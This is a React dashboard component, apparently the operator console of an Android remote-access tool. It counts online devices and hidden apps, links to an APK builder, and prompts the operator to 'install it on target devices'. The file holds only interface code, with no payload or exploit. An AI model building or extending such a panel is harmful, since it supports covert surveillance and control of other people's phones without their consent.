import React, { useState, useEffect, useCallback } from 'react';
import { devicesAPI } from '../services/api';
import { Link } from 'react-router-dom';
import { FiSmartphone, FiActivity, FiPower, FiEyeOff, FiRefreshCw, FiArrowRight, FiTool } from 'react-icons/fi';
import { toast } from 'react-toastify';
import LoadingSpinner from '../components/LoadingSpinner';
import EmptyState from '../components/EmptyState';

const STAT_CARDS = [
  { key: 'total', title: 'Total Devices', color: 'bg-primary-600/20 text-primary-400', icon: FiSmartphone },
  { key: 'online', title: 'Online Now', color: 'bg-green-600/20 text-green-400', icon: FiActivity },
  { key: 'offline', title: 'Offline', color: 'bg-red-600/20 text-red-400', icon: FiPower },
  { key: 'hidden', title: 'Hidden Apps', color: 'bg-purple-600/20 text-purple-400', icon: FiEyeOff },
];

const ANDROID_VERSION_MAP = {
  29: '10', 30: '11', 31: '12', 32: '12L',
  33: '13', 34: '14', 35: '15', 36: '16',
};

function getAndroidLabel(version) {
  return ANDROID_VERSION_MAP[version] || version || 'N/A';
}

export default function Dashboard() {
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [stats, setStats] = useState({ total: 0, online: 0, offline: 0, hidden: 0 });

  const loadDevices = useCallback(async () => {
    try {
      const res = await devicesAPI.getAll();
      if (res.data?.success) {
        const deviceList = res.data.devices || [];
        setDevices(deviceList);
        const online = deviceList.filter((d) => d.isOnline).length;
        const hidden = deviceList.filter((d) => d.isHidden).length;
        setStats({
          total: deviceList.length,
          online,
          offline: deviceList.length - online,
          hidden,
        });
        setError(null);
      }
    } catch (err) {
      const message = err.response?.data?.message || 'Failed to load devices';
      setError(message);
      toast.error(message);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadDevices();
    const interval = setInterval(loadDevices, 15000);
    return () => clearInterval(interval);
  }, [loadDevices]);

  const StatCard = ({ title, value, color, icon: Icon }) => (
    <div className="card p-6 hover:border-primary-600/30 transition-colors duration-200">
      <div className="flex items-center justify-between">
        <div>
          <p className="text-sm text-gray-400">{title}</p>
          <p className="text-3xl font-bold text-white mt-1">{value}</p>
        </div>
        <div className={`w-12 h-12 rounded-xl flex items-center justify-center text-xl ${color}`}>
          <Icon />
        </div>
      </div>
    </div>
  );

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold text-white">Dashboard</h1>
        <div className="flex items-center gap-3">
          <button onClick={loadDevices} className="btn-secondary text-sm flex items-center gap-2" disabled={loading}>
            <FiRefreshCw className={`${loading ? 'animate-spin' : ''}`} />
            Refresh
          </button>
          <span className="text-sm text-gray-500">Auto-refreshes every 15s</span>
        </div>
      </div>

      {/* Error Banner */}
      {error && (
        <div className="bg-red-900/30 border border-red-700/50 text-red-400 px-5 py-3 rounded-xl text-sm flex items-center gap-3">
          <FiPower className="text-lg flex-shrink-0" />
          <span>{error}</span>
          <button onClick={loadDevices} className="ml-auto underline hover:no-underline">Retry</button>
        </div>
      )}

      {/* Stats Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        {STAT_CARDS.map((card) => (
          <StatCard key={card.key} title={card.title} value={stats[card.key]} color={card.color} icon={card.icon} />
        ))}
      </div>

      {/* Quick Actions */}
      <div className="card p-6">
        <h2 className="text-lg font-semibold text-white mb-4">Quick Actions</h2>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <Link to="/devices" className="btn-secondary text-center text-sm py-3 flex items-center justify-center gap-2">
            <FiSmartphone /> View Devices
          </Link>
          <Link to="/apk-builder" className="btn-secondary text-center text-sm py-3 flex items-center justify-center gap-2">
            <FiTool /> Build APK
          </Link>
        </div>
      </div>

      {/* Recent Devices */}
      <div className="card">
        <div className="card-header flex items-center justify-between">
          <h2 className="text-lg font-semibold text-white">Connected Devices</h2>
          <Link to="/devices" className="text-sm text-primary-400 hover:text-primary-300 flex items-center gap-1">
            View All <FiArrowRight />
          </Link>
        </div>
        <div className="card-body">
          {loading ? (
            <LoadingSpinner />
          ) : devices.length === 0 ? (
            <EmptyState
              icon={FiSmartphone}
              title="No devices connected yet"
              description="Build an APK and install it on target devices"
              action={
                <Link to="/apk-builder" className="btn-primary text-sm">
                  Build APK
                </Link>
              }
            />
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="text-left text-xs text-gray-500 uppercase tracking-wider">
                    <th className="pb-3 pr-4">Device</th>
                    <th className="pb-3 pr-4">Android</th>
                    <th className="pb-3 pr-4">Status</th>
                    <th className="pb-3 pr-4">Hidden</th>
                    <th className="pb-3 pr-4">Last Seen</th>
                    <th className="pb-3 pr-4">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-dark-700">
                  {devices.slice(0, 10).map((device) => (
                    <tr key={device.deviceId} className="text-sm hover:bg-dark-700/30 transition-colors">
                      <td className="py-3 pr-4">
                        <div>
                          <p className="text-white font-medium">{device.deviceName || 'Unknown'}</p>
                          <p className="text-gray-500 text-xs">{device.manufacturer} {device.model}</p>
                        </div>
                      </td>
                      <td className="py-3 pr-4 text-gray-300">
                        Android {getAndroidLabel(device.sdkVersion)}
                      </td>
                      <td className="py-3 pr-4">
                        {device.isOnline ? (
                          <span className="badge-success">Online</span>
                        ) : (
                          <span className="badge-danger">Offline</span>
                        )}
                      </td>
                      <td className="py-3 pr-4">
                        {device.isHidden ? (
                          <span className="badge-warning">Hidden</span>
                        ) : (
                          <span className="text-gray-500">Visible</span>
                        )}
                      </td>
                      <td className="py-3 pr-4 text-gray-400 text-xs">
                        {device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never'}
                      </td>
                      <td className="py-3 pr-4">
                        <Link
                          to={`/devices/${device.deviceId}`}
                          className="btn-primary text-xs py-1.5 px-3"
                        >
                          Manage
                        </Link>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}